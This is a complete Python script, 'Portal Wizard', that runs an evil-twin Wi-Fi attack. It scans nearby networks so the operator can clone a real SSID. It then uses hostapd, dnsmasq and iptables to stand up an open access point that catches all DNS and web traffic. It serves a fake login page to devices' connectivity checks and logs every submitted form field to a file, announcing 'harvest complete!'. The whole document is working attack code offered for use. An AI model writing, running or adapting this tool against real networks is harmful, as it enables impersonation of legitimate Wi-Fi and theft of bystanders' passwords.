#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
from urllib.parse import parse_qs

# Logging config
logging.basicConfig(level=logging.INFO, format='%(message)s')

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_RUNNING = "\033[31m" if COLOR_ENABLED else ""
COLOR_STOP = "\033[33m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""


def color_text(text, color):
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text, *styles):
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text
# Config
AP_CHANNEL = "6"
AP_IP = "192.168.100.1"
SUBNET = "192.168.100.0"
NETMASK = "255.255.255.0"
DHCP_RANGE_START = "192.168.100.100"
DHCP_RANGE_END = "192.168.100.200"
LEASE_TIME = "12h"

BASE_DIR = os.path.dirname(__file__)
LOG_DIR = os.path.join(BASE_DIR, "log")
HTML_DIR = os.path.join(BASE_DIR, "html")
PORTAL_HTML = None
PORTAL_HTML_PATH = os.path.join(HTML_DIR, "portal.html")
CAPTURE_FILE_PATH = None
SUBMISSION_EVENT = threading.Event()
SUBMISSION_LOCK = threading.Lock()
LAST_SUBMISSION_IP = None



def load_portal_html():
    if not os.path.isfile(PORTAL_HTML_PATH):
        raise FileNotFoundError(f"Portal HTML file not found: {PORTAL_HTML_PATH}")
    with open(PORTAL_HTML_PATH, "r", encoding="utf-8") as portal_file:
        return portal_file.read()


def get_interface_chipset(interface):
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def list_network_interfaces():
    interfaces = []
    ip_link = subprocess.run(['ip', '-o', 'link', 'show'], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def scan_wireless_networks(interface, duration_seconds=15, show_progress=False):
    end_time = time.time() + max(1, duration_seconds)
    networks = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            result = subprocess.run(
                ["iw", "dev", interface, "scan"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        if result.returncode != 0:
            logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        current_signal = None
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                current_signal = None
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current_signal = float(parts[1])
                except (IndexError, ValueError):
                    current_signal = None
                continue
            if line.startswith("SSID:"):
                ssid = line.split(":", 1)[1].strip()
                if not ssid:
                    continue
                existing = networks.get(ssid)
                if existing is None or (
                    current_signal is not None
                    and (existing["signal"] is None or current_signal > existing["signal"])
                ):
                    networks[ssid] = {"ssid": ssid, "signal": current_signal}

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    return sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )


def prompt_manual_ssid():
    while True:
        manual = input(f"{style('Enter SSID', STYLE_BOLD)}: ").strip()
        if manual:
            return manual
        logging.warning("SSID cannot be empty.")


def select_network_ssid(interface, duration_seconds):
    while True:
        networks = scan_wireless_networks(interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            choice = input(
                f"{style('Rescan', STYLE_BOLD)} (R), "
                f"{style('Manual SSID', STYLE_BOLD)} (M), "
                f"or {style('Exit', STYLE_BOLD)} (E): "
            ).strip().lower()
            if choice == "r":
                continue
            if choice == "m":
                return prompt_manual_ssid()
            sys.exit(1)

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, network in enumerate(networks, start=1):
            signal = (
                f"{network['signal']:.1f} dBm"
                if network["signal"] is not None
                else "signal unknown"
            )
            label = f"{index}) {network['ssid']} -"
            logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, R to rescan, M for manual): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice == "m":
            return prompt_manual_ssid()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]["ssid"]
        logging.warning("Invalid selection. Try again.")


def select_interface(interfaces):
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select AP interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def sanitize_filename(name):
    sanitized = name.replace(os.sep, "_")
    if os.altsep:
        sanitized = sanitized.replace(os.altsep, "_")
    return sanitized

class CaptivePortalHandler(BaseHTTPRequestHandler):
    PORTAL_PATHS = {
        "/",
        "/index.html",
        "/captive.html",
        "/hotspot-detect.html",
        "/generate_204",
        "/gen_204",
        "/mobile/status.php",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/success.txt",
        "/library/test/success.html",
    }

    def _redirect_to_portal(self):
        self.send_response(302)
        self.send_header("Location", f"http://{AP_IP}/")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.end_headers()

    def do_GET(self):
        """Handle GET requests - display login page"""
        logging.info("Portal connection from %s to %s", self.client_address[0], self.path)

        if self.path in self.PORTAL_PATHS:
            if self.path in {"/generate_204", "/gen_204", "/redirect", "/connecttest.txt", "/ncsi.txt"}:
                self._redirect_to_portal()
                return

        # Always display login page regardless of path (improves captive portal reach)
        html_content = PORTAL_HTML or load_portal_html()

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Content-Length', len(html_content.encode('utf-8')))
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

    def do_POST(self):
        """Store submitted form data."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        decoded = post_data.decode("utf-8", errors="replace")
        parsed = parse_qs(decoded)
        global LAST_SUBMISSION_IP
        with SUBMISSION_LOCK:
            LAST_SUBMISSION_IP = self.client_address[0]
        SUBMISSION_EVENT.set()

        if CAPTURE_FILE_PATH:
            timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
            with open(CAPTURE_FILE_PATH, "a", encoding="utf-8") as capture_file:
                capture_file.write(f"[{timestamp}] {self.client_address[0]}\n")
                if parsed:
                    for key, values in parsed.items():
                        for value in values:
                            capture_file.write(f"{key}={value}\n")
                else:
                    capture_file.write(decoded + "\n")
                capture_file.write("\n")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Login received.")
    
    def log_message(self, format, *args):
        # Silence default HTTP logging.
        pass


def setup_ap():
    """Configure and start the Access Point."""
    logging.info("Setting up Access Point...")
    
    try:
        # Stop NetworkManager if it's active.
        subprocess.run(['systemctl', 'stop', 'NetworkManager'], stderr=subprocess.DEVNULL)
        subprocess.run(['systemctl', 'stop', 'wpa_supplicant'], stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        # Bring up interface.
        subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'down'])
        time.sleep(1)
        subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'up'])
        time.sleep(1)
        
        # Assign IP address.
        subprocess.run(['ip', 'addr', 'flush', 'dev', AP_INTERFACE])
        subprocess.run(['ip', 'addr', 'add', f'{AP_IP}/24', 'dev', AP_INTERFACE])
        
        # Configure hostapd.
        hostapd_conf = f"""
interface={AP_INTERFACE}
driver=nl80211
ssid={AP_SSID}
hw_mode=g
channel={AP_CHANNEL}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        # Start hostapd in the background.
        hostapd_process = subprocess.Popen(['hostapd', '/tmp/hostapd.conf'], 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE)
        time.sleep(3)
        
        # Configure dnsmasq for DHCP and DNS.
        dnsmasq_conf = f"""
interface={AP_INTERFACE}
dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{NETMASK},{LEASE_TIME}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
address=/#/{AP_IP}
server=8.8.8.8
log-queries
log-dhcp
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        # Start dnsmasq.
        dnsmasq_process = subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '--no-daemon'],
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE)
        time.sleep(2)
        
        # Enable forwarding.
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Configure iptables.
        subprocess.run(['iptables', '-t', 'nat', '-F'])
        subprocess.run(['iptables', '-F'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', AP_INTERFACE, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', f'{AP_IP}:80'])
        
        logging.info(f"Access Point '{AP_SSID}' started on {AP_IP}")
        logging.info(f"DHCP range: {DHCP_RANGE_START} - {DHCP_RANGE_END}")
        
        return hostapd_process, dnsmasq_process
        
    except Exception as e:
        logging.error(f"Error setting up AP: {e}")
        return None, None

def start_captive_portal():
    """Start the captive portal HTTP server."""
    logging.info(f"Starting Captive Portal HTTP server on {AP_IP}:80")
    
    server = HTTPServer((AP_IP, 80), CaptivePortalHandler)
    
    # Run server in a thread.
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    logging.info("Captive Portal HTTP server started")
    return server

def cleanup():
    """Cleanup configuration on exit."""
    logging.info("Cleaning up...")
    
    # Restore iptables.
    subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
    subprocess.run(['iptables', '-F'], stderr=subprocess.DEVNULL)
    
    # Stop services.
    subprocess.run(['pkill', 'hostapd'], stderr=subprocess.DEVNULL)
    subprocess.run(['pkill', 'dnsmasq'], stderr=subprocess.DEVNULL)
    
    # Bring interface down.
    subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'down'], stderr=subprocess.DEVNULL)
    
    # Restart NetworkManager.
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stderr=subprocess.DEVNULL)
    
    logging.info("Cleanup completed")

def run_portal_session():
    """Run a single portal session."""
    SUBMISSION_EVENT.clear()
    with SUBMISSION_LOCK:
        global LAST_SUBMISSION_IP
        LAST_SUBMISSION_IP = None
    
    # Select AP interface.
    interfaces = list_network_interfaces()
    globals()["AP_INTERFACE"] = select_interface(interfaces)

    subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'up'], stderr=subprocess.DEVNULL)
    logging.info("")
    while True:
        method = input(
            f"{style('SSID source', STYLE_BOLD)} - "
            f"{style('Scan', STYLE_BOLD)} (S) or {style('Manual', STYLE_BOLD)} (M): "
        ).strip().lower()
        if method in {"s", "scan", ""}:
            scan_prompt = (
                f"{style('Scan duration', STYLE_BOLD)} in seconds "
                f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): "
            )
            scan_input = input(scan_prompt).strip()
            try:
                scan_seconds = int(scan_input) if scan_input else 15
            except ValueError:
                logging.warning("Invalid duration. Using 15 seconds.")
                scan_seconds = 15
            if scan_seconds < 1:
                logging.warning("Scan duration too short. Using 1 second.")
                scan_seconds = 1

            input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {AP_INTERFACE}...")

            # Select SSID after scan (or enter manually).
            globals()["AP_SSID"] = select_network_ssid(AP_INTERFACE, scan_seconds)
            break
        if method in {"m", "manual"}:
            globals()["AP_SSID"] = prompt_manual_ssid()
            break
        logging.warning("Please enter S or M.")

    logging.info("")
    input(
        f"{style('Press Enter', STYLE_BOLD)} to start captive portal "
        f"'{style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}'..."
    )

    logging.info("")
    os.makedirs(LOG_DIR, exist_ok=True)
    capture_filename = sanitize_filename(AP_SSID)
    globals()["CAPTURE_FILE_PATH"] = os.path.join(LOG_DIR, capture_filename)
    logging.info("Capturing portal submissions in: %s", CAPTURE_FILE_PATH)
    
    http_server = None
    restart_requested = False
    try:
        # Start Access Point.
        hostapd_proc, dnsmasq_proc = setup_ap()
        if not hostapd_proc or not dnsmasq_proc:
            logging.error("Failed to start Access Point")
            return False
        
        # Give AP a moment to come up.
        time.sleep(5)
        
        # Start Captive Portal.
        http_server = start_captive_portal()
        
        logging.info("")
        logging.info("=" * 50)
        logging.info(f"Captive Portal is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
        logging.info(f"SSID: {style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}")
        logging.info("=" * 50)
        logging.info(
            "Press %s to %s",
            style("Ctrl+C", STYLE_BOLD),
            style("STOP the portal", COLOR_STOP, STYLE_BOLD),
        )
        
        # Keep processes referenced.
        processes = [hostapd_proc, dnsmasq_proc]
        
        # Main loop.
        while True:
            time.sleep(1)

            if SUBMISSION_EVENT.is_set():
                with SUBMISSION_LOCK:
                    SUBMISSION_EVENT.clear()

                logging.info("")
                logging.info(style("harvest complete!", COLOR_SUCCESS, STYLE_BOLD))
                while True:
                    exit_choice = input(
                        f"{style('Back to main menu', STYLE_BOLD)} (B) or {style('restart', STYLE_BOLD)} (R): "
                    ).strip().lower()
                    if exit_choice in {"b", "back"}:
                        break
                    if exit_choice in {"r", "restart"}:
                        restart_requested = True
                        break
                    logging.warning("Please enter B or R.")

                break

            # Check if processes are alive.
            for i, proc in enumerate(processes):
                if proc and proc.poll() is not None:
                    logging.error(f"Process {i} died!")
                    return False
                    
    except KeyboardInterrupt:
        logging.info(color_text("Shutting down...", COLOR_STOP))
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        if http_server:
            http_server.shutdown()
            http_server.server_close()
        cleanup()

    return restart_requested


def main():
    """Main entry point."""
    logging.info(color_text("Portal Wizard", COLOR_HEADER))
    logging.info("Starting Captive Portal System")
    logging.info("")
    
    # Verify privileges.
    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)
    
    # Verify required tools.
    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip', 'ethtool', 'iw']
    for tool in required_tools:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error(f"Required tool '{tool}' not found!")
            sys.exit(1)

    while True:
        restart = run_portal_session()
        if not restart:
            break
        logging.info(color_text("Restarting portal wizard...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()
